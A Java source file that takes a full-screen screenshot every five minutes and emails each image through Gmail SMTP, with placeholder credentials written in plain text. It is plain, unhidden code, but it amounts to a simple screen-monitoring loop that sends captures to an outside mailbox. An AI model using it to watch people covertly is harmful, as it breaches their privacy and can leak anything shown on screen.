import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;
import javax.activation.*;

public class Main {

    public static void main(String[] args) {
        String fromEmail = "your-email@gmail.com";            // your email
        String password = "your-email-password";              // password or app-specific password
        String toEmail = "recipient-email@gmail.com";         // recipient email
        String screenshotPath = "screenshot.png";
        int screenshotIntervalMillis = 300000;                // interval between screenshots (5 mins)

        while (true) {
            try {
                // Capture and save the screenshot
                ScreenshotUtility.captureScreenshot(screenshotPath);

                // Send the screenshot via email
                EmailUtility.sendEmailWithAttachment(fromEmail, password, toEmail, screenshotPath);

                // Wait for the specified interval before taking the next screenshot
                Thread.sleep(screenshotIntervalMillis);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

// Utility class for capturing screenshots
class ScreenshotUtility {

    // Method to capture and save a screenshot
    public static void captureScreenshot(String fileName) throws AWTException, IOException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenCapture = robot.createScreenCapture(screenRect);
        ImageIO.write(screenCapture, "png", new File(fileName));
        System.out.println("Screenshot saved: " + fileName);
    }
}

// Utility class for sending emails with an attachment
class EmailUtility {

    // Method to send an email with an attachment (screenshot)
    public static void sendEmailWithAttachment(String fromEmail, String password, String toEmail, String fileName) {
        // Set up email server properties
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        // Create session with authentication
        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(fromEmail, password);
            }
        });

        try {
            // Compose email
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(fromEmail));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toEmail));
            message.setSubject("Automatic Screenshot");

            // Body part for email text
            BodyPart messageBodyPart = new MimeBodyPart();
            messageBodyPart.setText("Screenshot");

            // Body part for attachment
            MimeBodyPart attachmentPart = new MimeBodyPart();
            DataSource source = new FileDataSource(fileName);
            attachmentPart.setDataHandler(new DataHandler(source));
            attachmentPart.setFileName(fileName);

            // Combine both body parts into a multipart message
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(messageBodyPart);
            multipart.addBodyPart(attachmentPart);

            message.setContent(multipart);

            // Send email
            Transport.send(message);
            System.out.println("Email sent with attachment");

        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }
}
